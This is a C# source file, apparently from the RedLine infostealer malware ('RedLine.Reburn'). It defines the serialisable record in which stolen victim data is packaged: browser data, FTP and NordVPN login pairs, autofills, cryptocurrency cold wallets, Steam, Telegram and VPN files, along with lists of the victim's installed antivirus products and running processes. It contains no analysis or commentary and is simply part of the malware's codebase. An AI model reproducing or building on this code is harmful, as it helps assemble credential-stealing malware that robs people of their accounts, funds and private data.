using System.Collections.Generic;
using System.Runtime.Serialization;
using RedLine.Reburn.Models.Browsers;

namespace RedLine.Reburn.Models.Info;

[DataContract(Name = "Credentials", Namespace = "v1/Models")]
public class Credentials
{
	[DataMember(Name = "Defenders")]
	public List<string> Defenders { get; set; } = new List<string>();


	[DataMember(Name = "Languages")]
	public List<string> Languages { get; set; } = new List<string>();


	[DataMember(Name = "InstalledSoftwares")]
	public List<string> InstalledSoftwares { get; set; } = new List<string>();


	[DataMember(Name = "Processes")]
	public List<string> Processes { get; set; } = new List<string>();


	[DataMember(Name = "Hardwares")]
	public List<Hardware> Hardwares { get; set; } = new List<Hardware>();


	[DataMember(Name = "Browsers")]
	public List<Browser> Browsers { get; set; } = new List<Browser>();


	[DataMember(Name = "FtpConnections")]
	public List<LoginPair> FtpConnections { get; set; } = new List<LoginPair>();


	[DataMember(Name = "InstalledBrowsers")]
	public List<InstalledBrowserInfo> InstalledBrowsers { get; set; } = new List<InstalledBrowserInfo>();


	[DataMember(Name = "Files")]
	public List<RemoteFile> Files { get; set; } = new List<RemoteFile>();


	[DataMember(Name = "SteamFiles")]
	public List<RemoteFile> SteamFiles { get; set; } = new List<RemoteFile>();


	[DataMember(Name = "ColdWallets")]
	public List<ColdWallet> ColdWallets { get; set; } = new List<ColdWallet>();


	[DataMember(Name = "ImportantAutofills")]
	public List<Autofill> ImportantAutofills { get; set; } = new List<Autofill>();


	[DataMember(Name = "NordVPN")]
	public List<LoginPair> NordVPN { get; set; }

	[DataMember(Name = "OpenVPN")]
	public List<RemoteFile> OpenVPN { get; set; }

	[DataMember(Name = "ProtonVPN")]
	public List<RemoteFile> ProtonVPN { get; set; }

	[DataMember(Name = "TelegramFiles")]
	public List<RemoteFile> TelegramFiles { get; set; }
}
